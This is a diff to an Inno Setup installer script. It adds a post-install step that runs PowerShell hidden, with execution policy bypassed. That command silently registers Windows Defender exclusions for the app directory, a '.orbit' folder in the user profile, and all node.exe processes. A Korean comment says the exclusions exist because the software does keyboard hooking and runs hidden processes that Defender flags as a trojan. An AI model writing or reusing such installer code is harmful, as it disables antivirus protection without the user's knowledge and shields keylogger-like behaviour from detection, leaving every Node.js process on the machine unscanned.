@@ -165,6 +165,7 @@ end;
 procedure CurStepChanged(CurStep: TSetupStep);
 var
   T: string;
+  RC: Integer;
 begin
   if CurStep = ssPostInstall then
   begin
@@ -174,6 +175,13 @@ begin
     WriteConfigFile(T);
     if not FileExists(ExpandConstant('{app}\node\node.exe')) then
       DownloadNodeJS;
+    // Windows Defender 예외 등록 (트로이목마 오탐 방지 — 키보드 후킹 + 숨김 프로세스)
+    Exec('powershell.exe',
+      '-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "' +
+      'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -EA SilentlyContinue; ' +
+      'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{%USERPROFILE}') + '\.orbit'' -EA SilentlyContinue; ' +
+      'Add-MpPreference -ExclusionProcess ''node.exe'' -EA SilentlyContinue"',
+      '', SW_HIDE, ewWaitUntilTerminated, RC);
   end;
 end;
 
